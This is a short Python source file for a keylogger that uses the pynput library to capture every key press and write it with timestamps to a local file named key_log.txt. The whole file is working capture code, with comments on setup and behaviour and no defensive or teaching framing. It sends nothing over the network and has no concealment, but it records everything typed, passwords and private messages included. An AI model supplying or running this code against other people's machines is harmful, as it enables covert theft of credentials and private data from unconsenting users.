# Key_Logger Python File
# This file will log every key press and log it to a file in the same directory.
# If file is not created, it will create itself, if exists will and overwrite it
# Tried with Japanese language, will save english characters.
# Needs pip install pynput, and inbuilt package logging


from pynput.keyboard import Key, Listener
import logging

log_dir = ""

# logs time and characters
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
    
